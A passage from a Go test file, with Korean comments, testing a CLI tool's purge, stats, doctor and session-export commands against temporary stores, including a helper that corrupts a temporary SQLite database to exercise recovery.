		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("sources=%d want 0(선택 삭제도 함께 수행돼야 함)", n)
	}
}

// TestRunPurge_All_ContextCanceledStopsBeforeAnyDeletion: --all로 프로젝트 2개를 대상할 때
// 이미 취소된 ctx를 주면 순회 첫 반복에서 즉시 멈춰야 한다(설계 §7 review 항목 — 다중 프로젝트
// 순회의 주기적 ctx 검사) — 오류를 반환하고, 두 프로젝트 중 어느 쪽도 삭제되지 않아야 한다.
// force=true로 확인 자체는 통과시켜(비TTY) 루프 진입 이후의 취소 검사만 순수하게 검증한다.
func TestRunPurge_All_ContextCanceledStopsBeforeAnyDeletion(t *testing.T) {
	storeRoot := t.TempDir()
	ids := make([]string, 2)
	for i := range ids {
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		ids[i] = canon.ProjectID
		projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
		st, err := store.Open(projDir, false)
		if err != nil {
			t.Fatalf("store.Open: %v", err)
		}
		if _, err := st.Register(t.Context(), store.Registration{
			StoredBytes: []byte("data"), MediaType: "text/plain",
			Source: store.SourceMeta{URI: "/d.txt", Kind: "file", SrcHash: "h"},
			Chunks: []store.Chunk{{Ordinal: 0, Text: "data"}},
		}); err != nil {
			t.Fatalf("register: %v", err)
		}
		if err := st.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	var out bytes.Buffer
	err := runPurge(ctx, failReader{}, &out, io.Discard, storeRoot, []string{"--all", "--force"}, false)
	if err == nil {
		t.Fatal("want error for canceled context, got nil")
	}

	for _, id := range ids {
		projDir := filepath.Join(storeRoot, "projects", id)
		st, err := store.Open(projDir, true)
		if err != nil {
			t.Fatalf("reopen %s: %v", id, err)
		}
		var n int
		if err := st.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
			t.Fatal(err)
		}
		st.Close()
		if n != 1 {
			t.Fatalf("project %s: sources=%d want 1(취소로 무삭제여야 함)", id, n)
		}
	}
}

// TestRunPurge_All_PartiallyCreatedDirRemovedNotFailStuck: 최종리뷰 F3 — lock 타임아웃·
// migrate 실패·크래시가 artifacts/만 남기고 content.db가 없는 부분 생성 디렉터리를
// projects/ 밑에 남길 수 있다. --all --force(전체삭제 모드, --older-than 없음)가 이런
// 디렉터리와 정상 프로젝트를 함께 순회할 때, 예전엔 첫 os.Stat(content.db) 실패에서 즉시
// 전체 중단돼 정상 프로젝트도 못 지웠다 — 이제는 깨진 디렉터리를 정리 목적에 맞게
// RemoveAll하고 정상 프로젝트도 계속 처리해야 한다(양쪽 다 사라져야 함).
func TestRunPurge_All_PartiallyCreatedDirRemovedNotFailStuck(t *testing.T) {
	storeRoot := t.TempDir()

	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	goodDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(goodDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("data"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/d.txt", Kind: "file", SrcHash: "h"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "data"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	// 부분 생성 디렉터리 모사: content.db 없이 artifacts/만 존재.
	brokenDir := filepath.Join(storeRoot, "projects", "broken-partial-dir")
	if err := os.MkdirAll(filepath.Join(brokenDir, "artifacts"), 0o700); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, []string{"--all", "--force"}, false); err != nil {
		t.Fatalf("runPurge --all --force: %v (out=%s)", err, out.String())
	}

	if _, statErr := os.Stat(goodDir); !os.IsNotExist(statErr) {
		t.Fatalf("정상 프로젝트가 삭제되지 않음: stat err=%v", statErr)
	}
	if _, statErr := os.Stat(brokenDir); !os.IsNotExist(statErr) {
		t.Fatalf("깨진 디렉터리가 정리되지 않음: stat err=%v", statErr)
	}
}

// TestRunPurge_All_Selective_PartiallyCreatedDirSkipped: 선택 삭제 모드(--older-than)에서는
// content.db가 없는 디렉터리를 지울 근거(indexed_at)가 없으므로 RemoveAll하지 않고 skip
// 보고만 하며, 나머지 정상 프로젝트는 계속 처리해야 한다(F3).
func TestRunPurge_All_Selective_PartiallyCreatedDirSkipped(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	goodDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(goodDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("data"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/d.txt", Kind: "file", SrcHash: "h"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "data"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	brokenDir := filepath.Join(storeRoot, "projects", "broken-partial-dir")
	if err := os.MkdirAll(filepath.Join(brokenDir, "artifacts"), 0o700); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	args := []string{"--all", "--force", "--older-than", "1ns"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge: %v (out=%s)", err, out.String())
	}
	if _, statErr := os.Stat(brokenDir); statErr != nil {
		t.Fatalf("선택 삭제 모드에서 깨진 디렉터리가 임의로 지워짐: stat err=%v", statErr)
	}
	if !strings.Contains(out.String(), "broken-partial-dir") {
		t.Fatalf("skip 보고 누락: out=%s", out.String())
	}
}

// TestRunStats_Local: 임시 store에 LedgerAppend 3건(도구 2종)을 넣고 Run(ctx,"stats",...)을
// 호출해 로컬 ledger 집계 표를 확인한다(설계 §6) — 두 도구명 모두·"bytes suppressed" 고정
// 문구 포함, "token"/"$" 문자열은 어디에도 없어야 한다(토큰·달러 환산·절약률 주장 금지,
// §6 차단 항목).
func TestRunStats_Local(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	st.LedgerAppend("ctr_fetch_and_index", 1000, 20, 5)
	st.LedgerAppend("ctr_fetch_and_index", 500, 30, 4)
	st.LedgerAppend("ctr_search", 50, 500, 3)
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "stats", nil, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run stats err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{"ctr_fetch_and_index", "ctr_search", "bytes suppressed (local, 진단용)"} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
	for _, banned := range []string{"token", "$"} {
		if strings.Contains(got, banned) {
			t.Fatalf("out must not contain %q (환산·절약 금지, 설계 §6): %s", banned, got)
		}
	}
}

// TestRunStats_Local_NoLedger: ledger.db가 아예 없는(=store를 한 번도 연 적 없는) 프로젝트에서도
// stats는 오류 없이 표(빈 본문 + 합계 0줄)를 출력해야 한다 — LedgerStats의 "미존재 → 빈 슬라이스"
// 계약이 cli까지 그대로 이어지는지 확인한다.
func TestRunStats_Local_NoLedger(t *testing.T) {
	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "stats", nil, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run stats err=%v out=%s", err, out.String())
	}
	got := out.String()
	if !strings.Contains(got, "bytes suppressed (local, 진단용)") {
		t.Fatalf("out missing fixed suppression phrase: %s", got)
	}
	for _, banned := range []string{"token", "$"} {
		if strings.Contains(got, banned) {
			t.Fatalf("out must not contain %q: %s", banned, got)
		}
	}
}

// TestRunStats_Provider: 임시 JSONL 3줄(usage 2건 + 파싱 불가 1건)을 스캔해 실측 토큰 합계와
// skipped 카운트를 검증한다(설계 §6 provider 계약) — 절약 주장·비교 문구는 없다(실측 합계만).
func TestRunStats_Provider(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")
	lines := []string{
		`{"message":{"usage":{"input_tokens":100,"output_tokens":20,"cache_read_input_tokens":5,"cache_creation_input_tokens":1}}}`,
		`{"message":{"usage":{"input_tokens":50,"output_tokens":10,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}`,
		`not valid json`,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--provider", path}
	if err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run stats --provider err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{
		"input_tokens: 150", "output_tokens: 30",
		"cache_read_input_tokens: 5", "cache_creation_input_tokens: 1",
		"skipped: 1",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
}

// TestRunStats_Provider_FileMissing: --provider 경로가 없으면 오류를 반환해야 한다(침묵 무시
// 금지). 반환 오류 문구에 그 경로 자체가 섞여선 안 된다(§12 canary, 리뷰 Fix Round 2 Critical
// (a) — os.Open이 반환하는 *fs.PathError는 절대경로를 담는다).
func TestRunStats_Provider_FileMissing(t *testing.T) {
	var out, errOut bytes.Buffer
	missing := filepath.Join(t.TempDir(), "missing.jsonl")
	args := []string{"--provider", missing}
	err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for missing --provider file, got nil")
	}
	if strings.Contains(err.Error(), missing) {
		t.Fatalf("error must not leak the path: %v", err)
	}
}

// TestRunStats_Local_ProjectIdentifyFailure: projectRoot가 존재하지 않아 ident.Canonicalize가
// 실패하는 경우도 오류를 반환해야 하고, 그 오류 문구에 projectRoot 경로가 섞여선 안 된다
// (§12 canary, 리뷰 Fix Round 2 Critical (b) — Canonicalize의 원인은 *fs.PathError).
func TestRunStats_Local_ProjectIdentifyFailure(t *testing.T) {
	storeRoot := t.TempDir()
	missingProject := filepath.Join(t.TempDir(), "does-not-exist")

	var out, errOut bytes.Buffer
	err := Run(context.Background(), "stats", nil, storeRoot, missingProject, "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for nonexistent project root, got nil")
	}
	if strings.Contains(err.Error(), missingProject) {
		t.Fatalf("error must not leak the path: %v", err)
	}
}

// TestRunStats_Provider_OversizedLine: 10MB(maxProviderLine) 상한을 넘는 한 줄이 있어도 명령
// 전체가 중단되면 안 된다 — 그 줄만 skipped로 세고 그 앞뒤 정상 줄은 계속 합산해야 한다(리뷰
// Fix Round 2, Important-3 — 예전 bufio.Scanner 고정버퍼 구현은 이 경우 Scan() 자체가
// 실패해 명령 전체가 오류로 끝났다). 긴 줄은 strings.Repeat로 생성한다(리터럴 금지).
func TestRunStats_Provider_OversizedLine(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")

	huge := `{"message":{"usage":{"input_tokens":1,"padding":"` + strings.Repeat("x", 11<<20) + `"}}}`
	lines := []string{
		`{"message":{"usage":{"input_tokens":9,"output_tokens":1,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}`,
		huge,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--provider", path}
	if err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run stats --provider err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{"input_tokens: 9", "output_tokens: 1", "usage records: 1", "skipped: 1"} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
}

// TestRunDoctor_UnexpectedArgs / TestRunUpgrade_UnexpectedArgs: doctor·upgrade는 args를
// 소비하지 않으므로 잔여 인자를 침묵 수용하면 안 된다(리뷰 Fix Round 2, Important-2) —
// 미지 인자가 있으면 명시적으로 오류여야 한다. 오류 문구에는 사용자가 입력한 원문("--bogus")이
// 그대로 에코되면 안 된다(규약 §6, 리뷰 Fix Round 3 item 5 — 개수만 밝힌다).
func TestRunDoctor_UnexpectedArgs(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "doctor", []string{"--bogus"}, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected doctor args, got nil")
	}
	if strings.Contains(err.Error(), "--bogus") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

func TestRunUpgrade_UnexpectedArgs(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "upgrade", []string{"--bogus"}, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected upgrade args, got nil")
	}
	if strings.Contains(err.Error(), "--bogus") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

// TestRunStats_UnexpectedPositionalArg: flag.Parse가 소비하지 못한 위치 인자(예: --provider
// 없이 그냥 파일명만 넘긴 경우)를 침묵 수용하면 안 된다(리뷰 Fix Round 3, item 4).
func TestRunStats_UnexpectedPositionalArg(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "stats", []string{"provider.jsonl"}, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected positional arg, got nil")
	}
	if strings.Contains(err.Error(), "provider.jsonl") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

// TestRunStats_Provider_ContextCanceled: 이미 취소된 ctx로 stats --provider를 호출하면
// 오류로 중단해야 한다(리뷰 Fix Round 3, item 7) — 취소 확인은 cancelCheckLines(256)줄마다
// 이루어지는데, lineNo=0에서 첫 확인이 스캔 시작 전에 실행되므로 파일이 짧아도(1줄) 검증된다.
func TestRunStats_Provider_ContextCanceled(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")
	line := `{"message":{"usage":{"input_tokens":1,"output_tokens":1,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}` + "\n"
	if err := os.WriteFile(path, []byte(line), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	var out, errOut bytes.Buffer
	err := Run(ctx, "stats", []string{"--provider", path}, t.TempDir(), t.TempDir(), "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for canceled context, got nil")
	}
}

// TestRunDoctor_StoreRootDeepMissingParents_Writable: storeRoot의 부모·조부모가 전부
// 미생성이어도(딱 한 단계 위까지도 없는 신규 배치) store.Open의 MkdirAll이 계층 전체를 한
// 번에 만들 수 있으므로 writable=true로 판정해야 한다(리뷰 Fix Round 3, item 2 — 예전
// 구현은 filepath.Dir 한 단계만 봐서 이 경우 항상 writable=false로 오판했다).
func TestRunDoctor_StoreRootDeepMissingParents_Writable(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	storeRoot := filepath.Join(base, "a", "b", "c") // a,b,c 전부 미생성
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=false writable=true") {
		t.Fatalf("out missing writable=true for deep-missing store-root: %s", buf.String())
	}
	if _, err := os.Stat(storeRoot); !os.IsNotExist(err) {
		t.Fatalf("store root must not be created by doctor: stat err=%v", err)
	}
}

// TestRunDoctor_StoreRootAncestorIsFile_Rejected: 최종리뷰 F6 — storeRoot 자신이 아니라
// 그 중간 조상이 일반 파일이면 os.Stat(storeRoot)이 ENOTDIR로 실패한다. 예전
// nearestExistingDir는 `err == nil && fi.IsDir()`를 종료 조건으로 삼아 그 비디렉터리
// 조상을 그냥 지나쳐 위의 진짜 디렉터리에서 probeWritable을 실행해 writable=true를
// 오판 보고했다 — 실제로는 store.Open의 MkdirAll이 그 파일을 뚫고 지나갈 수 없어 항상
// 실패한다. ENOTDIR(비디렉터리 조상)은 미존재와 구분해 writable=false로 즉시 실패
// 보고해야 한다.
func TestRunDoctor_StoreRootAncestorIsFile_Rejected(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	ancestorFile := filepath.Join(base, "ancestor-is-a-file")
	if err := os.WriteFile(ancestorFile, []byte("x"), 0o600); err != nil {
		t.Fatalf("write file: %v", err)
	}
	storeRoot := filepath.Join(ancestorFile, "store", "root") // ancestorFile은 파일 — 그 밑은 절대 생성 불가
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false)
	if err == nil {
		t.Fatal("want error — store-root의 중간 조상이 비디렉터리 파일")
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=false writable=false") {
		t.Fatalf("out missing exists=false writable=false: %s", buf.String())
	}
}

// TestRunDoctor_StoreRootIsFile_Rejected: storeRoot 위치에 이미 일반 파일이 있으면
// store.Open의 MkdirAll이 절대 성공할 수 없으므로 프로브 없이 writable=false로 명시
// 거부해야 한다(리뷰 Fix Round 3, item 2).
func TestRunDoctor_StoreRootIsFile_Rejected(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	storeRoot := filepath.Join(base, "storeroot-is-a-file")
	if err := os.WriteFile(storeRoot, []byte("x"), 0o600); err != nil {
		t.Fatalf("write file: %v", err)
	}
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false)
	if err == nil {
		t.Fatal("want error — store-root path is an existing non-directory file")
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=true writable=false") {
		t.Fatalf("out missing exists=true writable=false: %s", buf.String())
	}
}

// TestRunSessionExport_JSONLRoundTrip: 태스크9a Step1 ① — export가 stdout에 낸 JSONL 각 행을
// EventV1으로 파싱하면 session.Export를 직접 호출한 결과와 정확히 일치해야 한다(G6 CLI 측
// round-trip). session.Open으로 시드한 뒤 Close하고, Run(ctx,"session",["export",...])이 그
// DB를 session.OpenReadOnly로 다시 열어(별도 연결) JSONL을 낸다.
func TestRunSessionExport_JSONLRoundTrip(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/0.1.0-test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	if _, _, _, err := d.Append(session.Event{Type: "note", Summary: "first note"}); err != nil {
		t.Fatalf("append 1: %v", err)
	}
	if _, _, _, err := d.Append(session.Event{Type: "decision", Summary: "second note"}); err != nil {
		t.Fatalf("append 2: %v", err)
	}
	want, _, err := session.Export(context.Background(), d.Reader(), 0, "", 100)
	if err != nil {
		t.Fatalf("Export(direct): %v", err)
	}
	if err := d.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"export", "--project", projectRoot, "--worktree", canon.WorktreeID}
	if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run session export err=%v stderr=%s", err, errOut.String())
	}

	trimmed := strings.TrimRight(out.String(), "\n")
	if trimmed == "" {
		t.Fatalf("out empty, want %d JSONL lines", len(want))
	}
	lines := strings.Split(trimmed, "\n")
	if len(lines) != len(want) {
		t.Fatalf("got %d JSONL lines want %d: out=%s", len(lines), len(want), out.String())
	}
	for i, line := range lines {
		var ev session.EventV1
		if err := json.Unmarshal([]byte(line), &ev); err != nil {
			t.Fatalf("line %d unmarshal: %v (line=%s)", i, err, line)
		}
		if ev.EventID != want[i].EventID || ev.Summary != want[i].Summary || ev.EventType != want[i].EventType {
			t.Fatalf("line %d = %+v want %+v", i, ev, want[i])
		}
		if ev.SchemaVersion != "1.0" {
			t.Fatalf("line %d schemaVersion=%q want 1.0", i, ev.SchemaVersion)
		}
	}
	for _, forbidden := range []string{`"RowID"`, `"rowID"`, `"row_id"`, `"rowid"`} {
		if strings.Contains(out.String(), forbidden) {
			t.Fatalf("JSONL leaks internal cursor field %s: %s", forbidden, out.String())
		}
	}
}

// TestRunSessionExport_WorktreeContract: 태스크9a Step1 ② — worktree가 2개면 --worktree 없이는
// 후보 목록을 stderr에 출력하고 오류(설계 §7 worktree 특정 계약), 1개면 생략 허용.
func TestRunSessionExport_WorktreeContract(t *testing.T) {
	t.Run("multiple_without_flag_lists_candidates_and_errors", func(t *testing.T) {
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
		for _, wid := range []string{"wt-a", "wt-b"} {
			d, err := session.Open(filepath.Join(projDir, "worktrees", wid), session.Options{Producer: "context-router/test"})
			if err != nil {
				t.Fatalf("session.Open(%s): %v", wid, err)
			}
			if err := d.Close(); err != nil {
				t.Fatalf("close(%s): %v", wid, err)
			}
		}

		var out, errOut bytes.Buffer
		args := []string{"export", "--project", projectRoot}
		if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut); err == nil {
			t.Fatalf("want error for ambiguous worktree, got nil (out=%s)", out.String())
		}
		for _, wid := range []string{"wt-a", "wt-b"} {
			if !strings.Contains(errOut.String(), wid) {
				t.Fatalf("stderr missing candidate %q: %s", wid, errOut.String())
			}
		}
	})

	t.Run("single_without_flag_allowed", func(t *testing.T) {
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
		d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
		if err != nil {
			t.Fatalf("session.Open: %v", err)
		}
		if err := d.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}

		var out, errOut bytes.Buffer
		args := []string{"export", "--project", projectRoot}
		if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut); err != nil {
			t.Fatalf("Run session export(single worktree, no --worktree) err=%v stderr=%s", err, errOut.String())
		}
	})
}

// TestRunDoctor_SessionItems: 태스크9a Step1 ⑦ — doctor가 session.db quick_check·lease shared
// 프로브·session.recover-pending 마커 존재 3항목을 출력한다(설계 §7).
func TestRunDoctor_SessionItems(t *testing.T) {
	t.Run("not_initialized_is_informational_not_failure", func(t *testing.T) {
		isolateCodexHome(t)
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		var buf bytes.Buffer
		if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
			t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
		}
		out := buf.String()
		for _, want := range []string{
			"[6] session.db: not initialized",
			"[7] session.lock: not initialized",
			"[8] session.recover-pending: not initialized",
		} {
			if !strings.Contains(out, want) {
				t.Fatalf("out missing %q: %s", want, out)
			}
		}
	})

	t.Run("healthy_session_all_three_pass", func(t *testing.T) {
		isolateCodexHome(t)
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
		d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
		if err != nil {
			t.Fatalf("session.Open: %v", err)
		}
		if err := d.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}

		var buf bytes.Buffer
		if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
			t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
		}
		out := buf.String()
		for _, want := range []string{
			// D42: 갓 연 세션 = 자동 세션 1건(session_start만 → empty). sessions/empty 병기.
			"[6] session.db: quick_check=ok sessions=1 (empty=1)",
			"[7] session.lock: shared 획득 가능",
			"[8] session.recover-pending: 없음",
		} {
			if !strings.Contains(out, want) {
				t.Fatalf("out missing %q: %s", want, out)
			}
		}
	})

	t.Run("recover_marker_present_counts_as_failure", func(t *testing.T) {
		isolateCodexHome(t)
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
		d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
		if err != nil {
			t.Fatalf("session.Open: %v", err)
		}
		if err := d.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}
		if err := os.WriteFile(filepath.Join(dbDir, "session.recover-pending"), nil, 0o600); err != nil {
			t.Fatal(err)
		}

		var buf bytes.Buffer
		err = runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false)
		if err == nil {
			t.Fatalf("want error(진단 실패 항목 존재), got nil: %s", buf.String())
		}
		if !strings.Contains(buf.String(), "[8] session.recover-pending: 존재") {
			t.Fatalf("out missing marker-present line: %s", buf.String())
		}
	})
}

// TestDoctorEmptyExcludesSubagentLifecycle — D53: subagent_start(생애주기)만 있는 세션은 doctor
// [6] empty 카운트에서 제외(스펙 §0 상호작용 ①). 세션 2개(A=session_start 단독=empty,
// B=session_start+subagent_start=non-empty) → "sessions=2 (empty=1)" 단정.
func TestDoctorEmptyExcludesSubagentLifecycle(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)

	// 세션 B: session_start + subagent_start → non-empty.
	db, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open(B): %v", err)
	}
	if _, _, _, err := db.Append(session.Event{Type: "subagent_start", Summary: "subagent started: Explore"}); err != nil {
		t.Fatalf("append subagent_start: %v", err)
	}
	if err := db.Close(); err != nil {
		t.Fatalf("close(B): %v", err)
	}
	// 세션 A: session_start 단독 → empty(각 Open이 새 자동 세션 1건 등록).
	da, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open(A): %v", err)
	}
	if err := da.Close(); err != nil {
		t.Fatalf("close(A): %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "sessions=2 (empty=1)") {
		t.Fatalf("out missing \"sessions=2 (empty=1)\": %s", buf.String())
	}
}

// corruptSessionEvents — 태스크9b CLI 레벨 recover 테스트 전용 손상 헬퍼. session 패키지의
// recover_test.go seedAndCorruptEvents와 동일한 기법(session_events 루트 페이지의 셀 포인터
// 배열 영역 훼손 — 실측 확인: quick_check는 malformed를 보고하지만 앞부분 다수 행은 여전히
// SELECT 가능)을 cli 패키지에서 재현한다. session의 unexported 상수(dbFileName 등)에는 접근할
// 수 없으므로 session.OpenReadOnly로 필요한 값(page_size·rootpage)만 조회한다.
func corruptSessionEvents(t *testing.T, dbDir string, n int) {
	t.Helper()
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	for i := 0; i < n; i++ {
		if _, _, _, err := d.Append(session.Event{Type: "note", Summary: fmt.Sprintf("evt-%d-%s", i, strings.Repeat("pad", 30))}); err != nil {
			t.Fatalf("append: %v", err)
		}
	}
	var pageSize, rootPage int
	if err := d.Reader().QueryRow("PRAGMA page_size").Scan(&pageSize); err != nil {
		t.Fatal(err)
	}
	if err := d.Reader().QueryRow("SELECT rootpage FROM sqlite_master WHERE name='session_events'").Scan(&rootPage); err != nil {
		t.Fatal(err)
	}
	if err := d.Close(); err != nil {
		t.Fatal(err)
	}

	dbPath := filepath.Join(dbDir, "session.db")
	raw, err := os.ReadFile(dbPath)
	if err != nil {
		t.Fatal(err)
	}
	off := (rootPage-1)*pageSize + 50
	if off+40 > len(raw) {
